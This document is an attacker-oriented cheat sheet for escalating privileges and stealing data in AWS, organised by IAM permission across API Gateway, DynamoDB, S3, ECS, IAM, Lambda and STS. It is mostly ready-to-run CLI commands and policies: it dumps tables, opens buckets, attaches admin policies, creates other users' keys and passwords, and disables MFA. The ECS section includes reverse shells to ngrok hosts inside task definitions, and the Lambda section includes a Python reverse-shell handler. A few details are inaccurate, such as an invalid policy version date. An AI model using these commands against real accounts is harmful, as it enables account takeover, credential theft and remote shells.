# API Gateway
## apigateway:POST

Attacker can generate API keys for the APIs configured with this privilege (per region).

- `aws --region <region> apigateway create-api-key`

## apigateway:GET

With this privilege, attacker can obtain the generated API keys for the configured APIs (per region).

- `aws --region apigateway get-api-keys`
- `aws --region <region> apigateway get-api-key --api-key <key> --include-value`

## Potentials Impacts

Attacker cannot escalate privilege using these approaches, but they may gain access to sensitive information and data.

# DyanoDB
## dynamodb:BatchGetItem
With this privilege, Attacker can get contents from the tables with the help of primary key which can be obtained through enumerating metadata of the table. describe-table

- `aws dynamodb batch-get-item --request-items file:///tmp/test.json`

```
// test.json
{
   "ProductCatalog" : { // This is the table name
        "Keys": [
            {
            "Id" : { // Primary keys name
                "N": "32" // Value to search for, you could put here entries from 1 to 1000 to dump all those
            }
            }
        ]
    }
}
```

## dynamodb:GetItem
Similar to BatchGetItem, attacker can get contents from just one given table instead of dumping all the contents, with the help of primary key.

- `aws dynamodb get-item --table-name ProductCatalog --key`

```
file:///tmp/test.json

// test.json
{ 
"Id" : { 
`    `"N": "100"
}
}
```

## dynamodb:Query
Similar to GetItem, It allows attackers to leverage a subset of comparisons, but the only comparison authorized with the primary key (which must be provided) is EQ so they can't use a comparison to obtain the whole database in a request.

- `aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/test.json`

```
// test.json
{ 
"Id" : { 
    "ComparisonOperator":"EQ",
    "AttributeValueList": [ {"N": "100"} ]
    }
}
```

## dynamodb:Scan
With this privilege, attacker can easily dump the entire table.

- `aws dynamodb scan --table-name <table_name>`

## dynamodb:PartiQLSelect
With this privilege, attacker can easily dump the entire table.

- 	`aws dynamodb execute-statement --statement "SELECT * FROM ProductCatalog"`

## dynamodb:UpdateContinuousBackups | dynamodb:ExportTableToPointInTime
With this privilege, attacker can export the whole table to a S3 bucket. But this to work the table needs to have point-in-time-recovery enabled. describe-continuous-backups

-	` aws dynamodb export-table-to-point-in-time --table-arn <arn> --s3-bucket <bucket_name>`

If the point-in-time-recovery is not enabled, it can be enabled using the following command, but attacker will need dynamodb:ExportTableToPointInTime permission.

- `aws dynamodb update-continuous-backups --table-name <value> --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true`

## Potential Impacts
It is Indirect privilege escalation by locating sensitive information an contents inside the tables.

# S3 
## s3:PutBucketNotification
With this privilege, attacker might be able to hijack resources and escalate privileges inside a S3 bucket.

Example,
An attacker with those permissions over a CloudFormation bucket called "cf-templates-nohnwfax6a6i-us-east-1" will be able to hijack the deployment. The access can be given with the following policy:

```
{
    "Version":"2012-10-17",
    "Statement":[
        {
            "Effect":"Allow",
            "Action":[
                "s3:PutBucketNotification",
                "s3:GetBucketNotification",
                "s3:PutObject",
                "s3:GetObject"],
            "Resource":[
                "arn:aws:s3:::cf-templates-*\/*",
                "arn:aws:s3:::cf-templates-*"]
        },
        {
            "Effect":"Allow",
            "Action":"s3:ListAllMyBuckets",
            "Resource":"*"
        }]
    }

```

And the hijack is possible because there is a small time window from the moment the template is uploaded to the bucket to the moment the template is deployed. An attacker might just create a lambda function in his account that will trigger when a bucket notification is sent, and hijacks the content of that bucket.

![01428685504c756cabc45bc33faa31cb.png](_resources/01428685504c756cabc45bc33faa31cb.png)

The `PACU` tool can be used to automate this process.

## s3:PutObject | s3:GetObject
With this privilege, attackers can download and upload objects/contents from the S3 Bucket.
- An attacker with **read access** to them might find sensitive information and data on them.
- An attacker with **write access** to them could modify the data to abuse some service and try to escalate privileges.

If an EC2 instance is storing the user data in a S3 bucket, an attacker could modify it to execute arbitrary code inside the EC2 instance.

## s3:PutBucketPolicy
With this privilege, attacker can grant himself permissions over the S3 Buckets allowing the attacker to him to read, write, modify, delete and expose buckets. But the attacker needs to be from the same account, if not the error `The specified method is not allowed will trigger`

- `aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>`

```
// JSON policy example
{
  "Id": "Policy1568185116930",
  "Version": "2012-10-17",
  "Statement": [
  {
      "Sid": "Stmt1568184932403",
      "Action": [
        "s3:ListBucket"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::welcome",
      "Principal": "*"
  },
  {
    "Sid": "Stmt1568185007451",
    "Action": [
      "s3:GetObject"
    ],
    "Effect": "Allow",
    "Resource": "arn:aws:s3:::welcome/*",
    "Principal": "*"
  }
  ]
}
```

## s3:GetBucketAcl | s3:PutBucketAcl
With this prvilege, An attacker can grant him more access over specific buckets.

- `aws s3api get-bucket-acl --bucket <bucket-name>`
- `aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json`

```
// JSON ACL example

## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.

{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
```

## s3:GetObjectAcl, s3:PutObjectAcl
An attacker could abuse these permissions to grant him more access over specific objects inside buckets.
- Updating bucket object ACL
	-`aws s3api get-object-acl --bucket <bucekt-name> --key flag`
	-`aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json`

```
// JSON File Example
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
```

# ECS

## Stealing IAM Roles

Generally in ECS an IAM role will be assigned to the tasks running inside the container. If the task is set to run inside the EC2 instance, the EC2 instance will have another role attached to it. Which means if the attacker compromises an EC2 instance they can potentially obtain the the IAM role attached to the ECR and EC2 instance.
EC2 instance role will generally have permissions to update the container instance state of the EC2 instances being used as nodes inside the cluster. An attacker can modify the state of an instance to `DRAINING`, then the ECS will remove all the tasks from it and another instance will run as the `Replica`, which could potentially be the attacker's instance. From there he can still their IAM roles and other sensitive information and data from inside of the container.

- Changing the instance state to DRAINING
    - `aws ecs update-container-instances-state --cluster <cluster> --status DRAINING --container-instances <container-instance-id>`

There is also another similar way this technique can be done, but its not that stealthy as above, which is done by deregistering the EC2 instance from the cluster which will will force the tasks to be run in other instances.

- `aws ecs deregister-container-instance --cluster <cluster> --container-instance <container-instance-id> --force`

## Stealing Sensitive Information from Containers

The EC2 instance will probably also have the permission `ecr:GetAuthoriztion` which will allow the attacker to download image and search for sensitive information.

## iam:PassRole | ecs:RegisterTaskDefinition | ecs:RunTask

With these privileges, attacker can generate a new task definition with malicious container that steals the metadata credentials and run it.

- Generate task with reverse shell
    
    - `aws ecs register-task-definition --family <family_name> --task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"`
- Running task Definition
    
    - `aws ecs run-task --task-definition <family_name> --cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"`
- Delete task definition (after use)
    
    - `aws ecs deregister-task-definition --task-definition iam_exfiltration:1`

**Impact:** Direct privilege escalation to different ECS Roles.

## iam:PassRole | ecs:RegisterTaskDefinition | ecs:UpdateService | ecs:CreateService

It is similar as previous privilege, an attacker can generate a new task definition with a malicious container that steals the metadata credentials and run it by creating a new service with atleast one task running.

- Generate task definition with rev shell
    - `aws ecs register-task-definition --family iam_exfiltration --task-role-arn "$ECS_ROLE_ARN" --network-mode "awsvpc" --cpu 256 --memory 512 --requires-compatibilities "[\"FARGATE\"]" --container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"`
- Running the task creating a service
    - `aws ecs create-service --service-name exfiltration --task-definition iam_exfiltration --desired-count 1 --cluster <CLUSTER_ARN> --launch-type FARGATE --network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"`
- Running the task after updating the service
    - `aws ecs update-service --cluster <CLUSTER NAME> --service <SERVICE NAME> --task-definition <NEW TASK DEFINITION NAME>`

**Impact:** Direct privilege escalation to any ECS role.

## ecs:RegisterTaskDefinition | ecs:RunTask | ecs:StartTask | ecs:UpdateService | ecs:CreateService

This scenario is like the previous examples but this time without `iam:PassRole` permission. Even without a role, attacker can run a privileged container to escape to the node and steal the EC2 IAM role and the other ECS containers roles running in the node.

- Register task
    - `aws ecs register-task-definition --family iam_exfiltration --cpu 256 --memory 512 --requires-compatibilities '["EC2"]' --container-definitions file:///tmp/task.json --volumes file:///tmp/volumes.json`

```
// Task.json
[
    {
        "name":"exfil_creds",
        "image":"python:latest",
        "entryPoint":["sh", "-c"],
        "command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
        "mountPoints": [
            {
                "readOnly": false,
                "containerPath": "/var/run/docker.sock",
                "sourceVolume": "docker-socket"
            }
        ]
    }
]

//Volumes.json
[
    {
        "name": "docker-socket",
        "host": {
            "sourcePath": "/var/run/docker.sock"
        }
    }
]
```

- Run Task
    - `aws ecs run-task --task-definition iam_exfiltration --cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster --launch-type EC2`

*This attack is only possible if the ECS cluster is using EC2 instances and not Fargate.*

## ecs:ExecuteCommand | ecs:DescribeTasks

With these privileges, attacker can execute commands inside a running container and exfiltrate the IAM role attached to it. However, the container instance need to be running the `ExecuteCommandAgent` which is not set as default.
Therefore the attacker could try to enumerate container with `enableExecuteCommand` on each task.

```
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
   echo "Cluster $cluster"
   for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
      echo "  Task $task"
      aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
   done
done
```

- Execute a shell in a container
    - `aws ecs execute-command --interactive --command "sh" --cluster <CLUSTER_ARN> --task <TASK_ARN>`

**Impact:** Direct Privilege escalation to a different role attached to containers.

## Summary

- If he has `ecs:RunTask`, run a task with `aws ecs run-task --enable-execute-command [...]`
- If he has `ecs:StartTask`, run a task with `aws ecs start-task --enable-execute-command [...]`
- If he has `ecs:CreateService`, create a service with `aws ecs create-service --enable-execute-command [...]`
- If he has `ecs:UpdateService`, update a service with `aws ecs update-service --enable-execute-command [...]`

# IAM


## iam:CreatePolicyVersion

With this privilege, an attacker can create a new version of IAM policy that they have access to, which allows them to set their own custom permissions.

- `aws iam create-policy-version --policy-arn <target_policy_arn> --policy-document file:///path/to/administrator/policy.json --set-as-default`

```
// policy.json
{
  "Version": "2012-10-17",
  "Statement": {
    "Effect": "Allow",
    "Action": "i*",
    "Resource": "*"
  }
}
```

*Where the `policy.json` file would include a policy document that allows **any action against any resource** in the account.*

**Impact:** An attacker can escalate privilege to any AWS resources and entities.

## iam:SetDefaultPolicyVersion

With this privilege, an attacker can be able escalate privileges through existing policy versions that are not currently in use.

- `aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v4`

*Where “v2” is the policy version with the most privileges available.*
**Impact:** An attacker can escalate privilege by setting a different policy version which may have more permissions set.

## iam:CreateAccessKey

With this privilege, an attacker can create an access key ID and secret access key belonging to another user in the AWS environment.

- `aws iam create-access-key --user-name <target_user>`

*Where `target_user` has an extended set of permissions compared to the current user.*
**Impact:** An attacker can direct privilege to another user.

## iam:CreateLoginProfile

With this privilege, an attacker can create a password which is used to login to the AWS console on any user that does not already have a login profile setup.

- `aws iam create-login-profile --user-name <target_user> --no-password-reset-required --password '|[3rxYGGl3@~68)O{,-$1B"zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}t'`

*The abovementioned password meets the requirements of password policy of an account.*
**Impact:** Direct privilege escalation to vulnerable users

## iam:AttachUserPolicy

With this privilege, attacker can escalate privilege by attaching the policy to a user that they have access to, which adds the permission of that policy to the attacker.

- `aws iam attach-user-policy --user-name <username> --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"`

**Impact:** Direct privilege escalation to any privileged users.

## iam:AttachGroupPolicy

With this privilege, attacker can escalate privilege by attaching the policy a groupthat they are a part of, which adds the permission of that policy to the attacker.

- `aws iam attach-group-policy --group-name <group_name> --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"`

*Where the group abovementioned is the group where the attacker is part of.*
**Impact:** Direct privilege escalation to any privileged user.

## iam:AttachRolePolicy | sts:AssumeRole

With this privilege, attacker can escalate privilege by attaching a policy to a role that they have access to

- `aws iam attach-role-policy --role-name <role_name> --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"`

**Impact:** Direct privilege escalation to any privileged user.

## iam: PutUserPolicy

With this privilege, attacker can escalate privilege by creating or updating an inline policy for a user which they have access to.

- `aws iam put-user-policy --user-name <username> --policy-name <inline_policy> --policy-document "file:///path/to/administrator/policy.json"`

```
// Policy.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "*"
            ],
            "Resource": [
                "*"
            ]
        }
    ]
}
```

**Impact:** Direct privilege escalation to any privileged user.

## iam:PutGroupPolicy

With this privilege, attacker can escalate privilege by creating or updating an inline policy for a group that they are a part of.

- `aws iam put-group-policy --group-name <group_name> --policy-name <group_inline_policy> -policy-document file:///path/to/administrator/policy.json`

**Impact:** Direct Privilege escalation to privileged user.

## iam:PutRolePolicy | sts: AssumeRole

With this privilege, attacker can escalate privilege by creating or updating an inline policy for a role that they have access to.

- `aws iam put-role-policy --role-name <role_name> --policy-name <role_inline_policy> --policy-document file:///path/to/administrator/policy.json`

*Where the abovementioned role is role that the current user can temporarily assume with `sts:AssumeRole`.*
**Impact:** Direct privilege escalation to privileged user.

## iam:AddUserToGroup

With this privilege, an attacker can add themselves to an existing prvileged IAM group in the AWS account.

- `aws iam add-user-to-group --group-name <target_group> --user-name <username>`

**Impact:** Direct privilege escalation to any privileged group.

## iam:UpdateAssumeRolePolicy | sts:AssumeRole

With these two privilege, attacker can change the assume role policy document of any existing role to allow them to assume that role.

- `aws iam update-assume-role-policy --role-name <role_to_assume> --policy-document file:///path/to/assume/role/policy.json`

Assume Role Policy looks something like this:

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "sts:AssumeRole",
            "Principal": {
                "AWS": "$USER_ARN"
            }
        }
    ]
}
```

**Impact:** Direct Privllege escalation to any privileged role.

## iam:DeactivateMFADevice

With this privilege, attacker can deactivate the specified MFA device and remove its association with IAM user for which it was originally enabled.

- `aws iam deactivate-mfa-device --user-name <username> --serial-number <value>`

**Impact:** Indirect privilege escalation to a privilged user by disabling the MFA device.

# Lambda
## iam:PassRole | lambda:CreateFunction | lambda:InvokeFunction

With these privileges, an attacker can escalate privilege by passing an existing IAM role to a new lambda function that include code to any relevant programming language supported by AWS, and the code can be invoked through the AWS API.
For example, a reverse shell code which can be used by attacker.

```
// rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('ip',4545))
   os.dup2(s.fileno(),0)
   os.dup2(s.fileno(),1)
   os.dup2(s.fileno(),2)
   p=subprocess.call(['/bin/sh','-i'])
   time.sleep(900)
   return 0
```

Now zip the file: `zip "rev.zip" "rev.py"`

- Creating the lambda function
    - `aws lambda create-function --function-name my_function --runtime python3.9 --role <arn_of_lambda_role> --handler rev.lambda_handler --zip-file fileb://rev.zip`
- Invoking the function
    - `aws lambda invoke --function-name my_function output.txt`

There is also another Interesting way to get admin privilege in the compromised account if lambda has enough permission.
For example, attaching the admin policy to a user using the lambda function.

```
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return response
```

**Impact:** Direct privilege escalation to any lambda service role specified.

## iam:PassRole | lambda:CreateFunction | lambda:CreateEventSourceMapping

With these privileges, an attacker can escalate privileges by passing an existing IAM role to a new Lambda function and invoke the function without the need of `lambda:InvokeFunction`. For example, An attacker would create a DynamoDB table or use an existing one, to create an event source mapping for the lambda function pointing to that DynamoDB table. And they would either put an item into the table or wait for any other relevant method so that the lambda function is invoked.
`aws lambda create-function --function-name my_function --runtime python3.8 --role <arn_of_lambda_role> --handler lambda_function.lambda_handler --zip-file fileb://rev.zip`

*Where the rev.zip file is same to the reverse shell script from previous example*

The Next step depends whether the DynamoDB is being used in the account or not. If it is being used, just creating the event source mapping for the lambda function is enough (which will be shown below). But if it is not being used, the attacker will need to create a table with streaming enabled, for which they will require the following privilege, `dynamodb:PutItem` and `dynamodb:CreateTable`.

```
aws dynamodb create-table --table-name my_table \
    --attribute-definitions AttributeName=Test,AttributeType=S \
    --key-schema AttributeName=Test,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```

After the following command, the attacker will connect the lambda function and the DynanoDB table by creating an event source mapping with the following command:

- `aws lambda create-event-source-mapping --function-name my_function --event-source-arn <arn_of_dynamodb_table_stream> --enabled --starting-position LATEST`

Now that the Lambda function and the stream are linked, the attacker may use the DynamoDB stream to invoke the Lambda function. This may be accomplished by inserting an item into the DynamoDB table.

- `aws dynamodb put-item --table-name my_table --item Test={S="Random string"}`

The lambda function will be invoked, and the attacker will have administrative privilege over the AWS account.

**Impact:** Direct privilege escalation to the lambda service role specified.

## lambda:AddPermission

With this privilege, an attacker can grant themselves or any other compromised users any permissions.

- Add permission command
    - `aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<user arn>`
- Invoke Function
    - `aws lambda lambda invoke --function-name <func_name> /tmp/outout`

**Impact:** Direct privilege escalation to the lambda service role used by granting privileged permission to the attacker.

## lambda:UpdateFunctionCode

With this privileges, an attacker can update an existing lambda function with an IAM role attached to it. if the attacker does not have `lamda:InvokeFunction` they will need to wait until the function is invoked.

- `aws lambda update-function-code --function-name target_function --zip-file file:///my/lambda/code/rev.zip`

**Impact:** Direct Privilege escalation to the lambda service role used.

# STS
## sts:AssumeRole

Every role has a role trust policy that specifies who can assume the created role. For example,
The following role trust policy indicates that anyone can assume it, therefore any user will be able to escalate privilege to the permissions associated with that role.

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

The role can be assumed with the following command:

- `aws sts assume-role --role-arn $ROLE_ARN --role-session-name sessionname`

## sts:AssumeRoleWithSAML

A trust policy with this role grants users authenticated via SAML access to impersonate the role.
An example of trust policy with this permission,

```
{
    "Version": "2022-12-15",
    "Statement": [
        {
            "Sid": "OneLogin",
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::290594632123:saml-provider/OneLogin"
            },
            "Action": "sts:AssumeRoleWithSAML",
            "Condition": {
                "StringEquals": {
                    "SAML:aud": "https://signin.aws.amazon.com/saml"
                }
            }
        }
    ]
}
```

To assume this role, use the following command,

- `aws sts assume-role-with-saml --role-arn <role_arn> --principal-arn <principal_arn>`
    Providers will also have their own tool for making it easier.
- `onelogin-aws-assume-role --onelogin-subdomain mettle --onelogin-app-id 283740 --aws-region eu-west-1 -z 3600`

## sts:AssumeRoleWithWebIdentity

This privilege grants permission to obtain a set of temporary credentials for users who have been authenticated in a mobile, web application, EKS with a web identity provider. There is official AWS docs about this web identity [here](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html).

For example, An IAM role can be assumed by an EKS service account, it will have a token in `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` and can assume the role and get credentials using command like this:

- `aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/<role_name> --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token`
**Impact:**The attackers will be able to assume role of higher privileges through this privilege.
